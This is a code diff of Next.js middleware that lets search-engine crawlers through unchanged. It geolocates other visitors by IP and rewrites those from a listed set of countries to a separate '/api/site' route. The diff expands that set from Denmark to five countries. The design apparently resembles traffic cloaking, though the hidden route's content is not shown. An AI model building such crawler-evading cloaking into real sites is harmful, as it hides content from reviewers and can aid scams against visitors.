@@ -4,17 +4,20 @@ function isBot(ua: string) {
     return /bot|crawl|spider|slurp|bing|yandex|baidu/i.test(ua);
 }
 
+// Список дозволених країн
+const allowedCountries = ['DE', 'BE', 'NL', 'SG', 'GB']; // Німеччина, Бельгія, Нідерланди, Сінгапур, UK
+
 export async function middleware(req: NextRequest) {
     const ua = req.headers.get('user-agent')?.toLowerCase() || '';
     const forwarded = req.headers.get('x-forwarded-for');
     const ip = forwarded?.split(',')[0].trim() || '8.8.8.8';
 
-
     if (isBot(ua)) return NextResponse.next();
 
     try {
-        const geo = await fetch(`https://ipwho.is/${ip}`).then(res => res.json());
-        if (geo.success && geo.country_code === 'DK') {
+        const geo = await fetch(`https://ipwho.is/${ip}`).then((res) => res.json());
+
+        if (geo.success && allowedCountries.includes(geo.country_code)) {
             const url = req.nextUrl.clone();
             url.pathname = '/api/site';
             url.searchParams.set('ip', ip);
@@ -33,4 +36,4 @@ export const config = {
         '/',
         '/((?!_next|api|favicon.ico|assets|fonts|images|img|.*\\.svg$|.*\\.png$|.*\\.jpg$|.*\\.jpeg$|.*\\.webp$|.*\\.css$|.*\\.js$).*)',
     ],
-}
+};
